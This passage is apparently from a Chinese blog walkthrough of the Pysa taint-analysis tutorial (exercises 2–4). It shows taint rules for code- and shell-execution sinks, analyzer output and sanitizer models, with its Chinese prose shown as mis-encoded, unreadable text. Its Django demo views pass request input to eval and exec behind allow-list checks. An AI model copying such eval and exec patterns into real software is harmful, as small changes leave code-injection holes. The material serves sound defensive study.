class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>taint.config è§„åˆ™ä¸­å·²ç»æ·»åŠ äº†åç§°ä¸º <code>ShellExecution</code> çš„æ±‡ç‚¹ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;sources&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CustomUserControlled&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;comment&quot;</span>: <span class="string">&quot;use to annotate user input&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;sinks&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CodeExecution&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;comment&quot;</span>: <span class="string">&quot;use to annotate execution of python code&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ShellExecution&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;comment&quot;</span>: <span class="string">&quot;use to annotate execution of shell scripts&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;features&quot;</span>: [],</span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;rules&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Possible RCE:&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;code&quot;</span>: <span class="number">5001</span>,</span><br><span class="line">      <span class="attr">&quot;sources&quot;</span>: [ <span class="string">&quot;CustomUserControlled&quot;</span> ],</span><br><span class="line">      <span class="attr">&quot;sinks&quot;</span>: [ <span class="string">&quot;CodeExecution&quot;</span> ],</span><br><span class="line">      <span class="attr">&quot;message_format&quot;</span>: <span class="string">&quot;User specified data may reach a code execution sink&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ taint.config ä¸­æ·»åŠ ä¸€ä¸ª <code>CustomUserControlled</code> æºç‚¹åˆ° <code>ShellExecution</code> æ±‡ç‚¹çš„è§„åˆ™ï¼Œå°† code å®šä¹‰ä¸º 5002 ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&quot;rules&quot;: [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Possible RCE:&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;code&quot;</span>: <span class="number">5002</span>,</span><br><span class="line">    <span class="attr">&quot;sources&quot;</span>: [ <span class="string">&quot;CustomUserControlled&quot;</span> ],</span><br><span class="line">    <span class="attr">&quot;sinks&quot;</span>: [ <span class="string">&quot;ShellExecution&quot;</span> ],</span><br><span class="line">    <span class="attr">&quot;message_format&quot;</span>: <span class="string">&quot;User specified data may reach a shell execution sink&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>sources_sinks.pysa åŒ…å«å¸¦æœ‰æ±¡ç‚¹æ³¨é‡Šçš„æ¨¡å‹ï¼Œè¿™äº›æ¨¡å‹å¿…é¡»åŒ¹é… <code>.pyi</code> å­˜æ ¹æ–‡ä»¶ä¸­çš„å­˜æ ¹æˆ–æºç ã€‚å°† <code>.pyi</code> å­˜æ ¹æˆ–æºç è½¬æ¢ä¸ºæ¨¡å‹æ—¶ï¼Œå¿…é¡»ç¡®ä¿ï¼š</p><ul><li>å‡½æ•°åä¸å˜</li><li>å‚æ•°åä¸å˜</li><li>åˆ é™¤ç±»å‹æ³¨é‡Š</li><li>å‡½æ•°æˆ–å±æ€§æ˜¯å®Œå…¨é™å®šçš„</li></ul><p>Pyre çš„ä¸»è¦å­˜æ ¹æ¥è‡ªäº <a href="https://github.com/python/typeshed">typeshed</a>ï¼ˆåŒ…å« Python æ ‡å‡†åº“å’Œ Python å†…ç½®åŒ…çš„å¤–éƒ¨ç±»å‹æ³¨é‡Šï¼Œä»¥åŠé¡¹ç›®å¤–éƒ¨äººå‘˜è´¡çŒ®çš„ç¬¬ä¸‰æ–¹åŒ…ï¼‰ã€‚è¿˜æœ‰ä¸€éƒ¨åˆ†æ˜¯ä¸º Pysa ç¼–å†™çš„å­˜æ ¹ï¼Œæ¶µç›– Django ç­‰ç¬¬ä¸‰æ–¹åº“ï¼Œä¸åŒ…å«åœ¨ typeshed ä¸­ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">django.http.request.HttpRequest.GET: TaintSource[CustomUserControlled] &#x3D; ...</span><br><span class="line"></span><br><span class="line">def eval(__source: TaintSink[CodeExecution], __globals, __locals): ...</span><br><span class="line"></span><br><span class="line">def subprocess.getoutput(cmd: TaintSink[ShellExecution]): ...</span><br></pre></td></tr></table></figure><p>æ·»åŠ è§„åˆ™ï¼ŒæŒ‡æ˜ä½¿ç”¨æºç‚¹å’Œæ±‡ç‚¹çš„å‡½æ•°ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">django.http.request.HttpRequest.POST: TaintSource[CustomUserControlled] &#x3D; ...</span><br><span class="line"></span><br><span class="line">def exec(__source: TaintSink[CodeExecution], __globals, __locals): ...</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œ <code>pyre analyze</code> ï¼Œç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">(tutorial) jck@analysis:~/pyre-check/documentation/pysa_tutorial/exercise2$ pyre analyze</span><br><span class="line">Æ› No cached overrides loaded, computing overrides...</span><br><span class="line">Æ› `google.protobuf.message.Message.ClearField` has 57 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `google.protobuf.message.Message.__init__` has 58 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `object.__eq__` has 82 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `object.__init__` has 754 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `object.__ne__` has 60 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `type.__call__` has 131 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `type.__init__` has 448 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `type.__new__` has 75 overrides, this might slow down the analysis considerably.</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 30,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 34,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 30,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 56,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5002,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible RCE:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5002]: User specified data may reach a shell execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5002]: User specified data may reach a shell execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5002]: User specified data may reach a shell execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_fours&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 22,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 9,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 22,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 35,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5001,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible RCE:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5001]: User specified data may reach a code execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5001]: User specified data may reach a code execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5001]: User specified data may reach a code execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_threes&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 14,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 18,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 14,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 35,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5001,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible RCE:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5001]: User specified data may reach a code execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5001]: User specified data may reach a code execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5001]: User specified data may reach a code execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_twos&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="exercise3"><a href="#exercise3" class="headerlink" title="exercise3"></a>exercise3</h2><p>ç›´æ¥è¿è¡Œ <code>pyre analyze</code> æç¤ºæ¨¡å‹éªŒè¯é”™è¯¯ï¼š<a href="https://github.com/facebook/pyre-check/issues/441">Found 93 model verification errors in exercise3 #441</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Æ› Finding taint models <span class="keyword">in</span> `/home/jck/pyre-check/stubs/taint, /home/jck/pyre-check/documentation/pysa_tutorial/exercise3`.Æ› Found 93 model verification errors!</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>æ·»åŠ  <code>--no-verify</code> å‚æ•°å¾—åˆ°é¢„æœŸåé¦ˆï¼Œå­˜åœ¨è¯¯æŠ¥ï¼ˆå‡é˜³ï¼‰é—®é¢˜ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Æ› No cached overrides loaded, computing overrides...</span><br><span class="line">Æ› `google.protobuf.message.Message.ClearField` has 57 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `google.protobuf.message.Message.__init__` has 58 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› Iteration <span class="comment">#2. 4 Callables [zipfile.ZipFile::__init__ (override), str::format (override), shelve.Shelf::__init__ (overri[</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 34,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 9,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 34,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 35,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5001,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible shell injection&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_threes&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 24,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 18,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 24,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 35,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5001,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible shell injection&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_twos&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>Pysa ä¸ºè®¸å¤š Python æ ‡å‡†åº“å’Œå¼€æºåº“æä¾›äº†é¢„å…ˆç¼–å†™çš„æºç‚¹ã€æ±‡ç‚¹å’Œè§„åˆ™ã€‚é¢„å…ˆå†™å¥½çš„ <code>taint.config</code> å’Œ <code>*.pysa</code> æ–‡ä»¶åœ¨ <a href="https://github.com/facebook/pyre-check/tree/master/stubs/taint"><code>stubs/taint</code></a> æ–‡ä»¶å¤¹ä¸­ã€‚</p><p>views.py æ‰€æœ‰å‡½æ•°éƒ½æ²¡æœ‰å®‰å…¨é—®é¢˜ï¼Œä½†æ‰§è¡Œ <code>pyre analyze --no-verify</code> å‡ºç°è¯¯æŠ¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpRequest, HttpResponse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">example_sanitizer</span>():</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_operator_safe</span>(<span class="params">request: HttpRequest</span>) -&gt; str:</span></span><br><span class="line">    operator = request.POST[<span class="string">&quot;operator&quot;</span>]</span><br><span class="line">    <span class="keyword">assert</span> operator <span class="keyword">in</span> &#123;<span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;/&quot;</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> operator</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_on_twos</span>(<span class="params">request: HttpRequest</span>) -&gt; HttpResponse:</span></span><br><span class="line">    operator = get_operator_safe(request)</span><br><span class="line">    result = <span class="built_in">eval</span>(<span class="string">f&quot;2 <span class="subst">&#123;operator&#125;</span> 2&quot;</span>)  <span class="comment"># noqa: P204</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_on_threes</span>(<span class="params">request: HttpRequest</span>) -&gt; HttpResponse:</span></span><br><span class="line">    operator = request.GET[<span class="string">&quot;operator&quot;</span>]</span><br><span class="line">    <span class="keyword">assert</span> operator <span class="keyword">in</span> &#123;<span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;/&quot;</span>&#125;</span><br><span class="line">    exec(<span class="string">f&quot;result = 3 <span class="subst">&#123;operator&#125;</span> 3&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result  <span class="comment"># noqa: F821</span></span><br></pre></td></tr></table></figure><p>sanitizers.pysa ä¸­å®šä¹‰äº†æ¶ˆæ¯’å™¨ï¼ˆSanitizerï¼‰ï¼Œå®ƒä»¬æ ‡è®°äº† Pysa å¯¹å¾…æ•´ä¸ªå¯è°ƒç”¨å¯¹è±¡çš„æ–¹å¼å˜åŒ–ï¼Œè€Œä¸ä»…ä»…æ˜¯è¿”å›å€¼æˆ–å‚æ•°ï¼Œä½¿ç”¨è£…é¥°å™¨è¡¨ç¤ºæ³¨é‡Šã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@Sanitize</span><br><span class="line">def views.example_sanitizer(): ...</span><br></pre></td></tr></table></figure><p>å¯¹äº <code>operate_on_twos</code> å‡½æ•°ï¼Œå› ä¸ºæœ‰è°ƒç”¨ <code>get_operator_safe</code> è¿‡æ»¤è¯·æ±‚ï¼Œæ‰€ä»¥åç»­è°ƒç”¨ <code>eval()</code> ä¹Ÿæ˜¯å®‰å…¨çš„ï¼Œå°† <code>get_operator_safe</code> æ ‡è®°ä¸ºæ¶ˆæ¯’å™¨ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@Sanitize</span><br><span class="line">def views.get_operator_safe(request: TaintSource[UserControlled]): ...</span><br></pre></td></tr></table></figure><p>å†æ¬¡æ‰§è¡Œ <code>pyre analyze --no-verify</code> åªå‰©ä¸€ä¸ªè¯¯æŠ¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Æ› No cached overrides loaded, computing overrides...</span><br><span class="line">Æ› `google.protobuf.message.Message.ClearField` has 57 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `google.protobuf.message.Message.__init__` has 58 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› Iteration <span class="comment">#2. 4 Callables [zipfile.ZipFile::__init__ (override), str::format (override), shelve.Shelf::__init__ (overri[</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 34,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 9,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 34,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 35,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5001,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible shell injection&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible shell injection [5001]: Data from [UserControlled] source(s) may reach [RemoteCodeExecution] sink(s)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_threes&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><code>operate_on_threes</code> å‡½æ•°æœ¬èº«å°±è¿‡æ»¤äº†è¯·æ±‚ï¼Œè¿™é‡Œæ·»åŠ ä¸€ä¸ª identity å‡½æ•°è°ƒç”¨ï¼Œå°†å‚æ•°åŸæ ·è¿”å›ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">identity</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_on_threes</span>(<span class="params">request: HttpRequest</span>) -&gt; HttpResponse:</span></span><br><span class="line">    operator = request.GET[<span class="string">&quot;operator&quot;</span>]</span><br><span class="line">    <span class="keyword">assert</span> operator <span class="keyword">in</span> &#123;<span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;/&quot;</span>&#125;</span><br><span class="line">    operator = identity(operator)</span><br><span class="line">    exec(<span class="string">f&quot;result = 3 <span class="subst">&#123;operator&#125;</span> 3&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result  <span class="comment"># noqa: F821</span></span><br></pre></td></tr></table></figure><p>å°† identity å‡½æ•°æ ‡è®°ä¸ºæ¶ˆæ¯’å™¨ï¼ŒæŒ‡æ˜ç»è¿‡è¯¥æ¶ˆæ¯’å™¨çš„æ±¡ç‚¹æºå°±ä¸å†æ˜¯æ±¡ç‚¹æ•°æ®ï¼Œä¸ç”¨ç»§ç»­è·Ÿè¸ªã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@Sanitize</span><br><span class="line">def views.identity(x: TaintSource[UserControlled]): ...</span><br></pre></td></tr></table></figure><p>å†æ¬¡æ‰§è¡Œ <code>pyre analyze --no-verify</code>ï¼Œä¸å­˜åœ¨è¯¯æŠ¥äº†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Æ› No cached overrides loaded, computing overrides...</span><br><span class="line">Æ› `google.protobuf.message.Message.ClearField` has 57 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› `google.protobuf.message.Message.__init__` has 58 overrides, this might slow down the analysis considerably.</span><br><span class="line">Æ› Iteration <span class="comment">#2. 4 Callables [zipfile.ZipFile::__init__ (override), str::format (override), shelve.Shelf::__init__ (overri[]</span></span><br></pre></td></tr></table></figure><h2 id="exercise4"><a href="#exercise4" class="headerlink" title="exercise4"></a>exercise4</h2><p>ä½¿ç”¨ SAPP (Static Analysis Post Processor) æä¾›çš„äº¤äº’å¼å‘½ä»¤è¡Œã€‚</p><p>views.py å‡½æ•°åŒæ ·ä¸å­˜åœ¨å®‰å…¨é—®é¢˜ï¼Œä½†åˆäº§ç”Ÿäº†è¯¯æŠ¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpRequest, HttpResponse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">example_feature</span>(<span class="params">argument: <span class="built_in">str</span></span>) -&gt; <span class="keyword">None</span>:</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 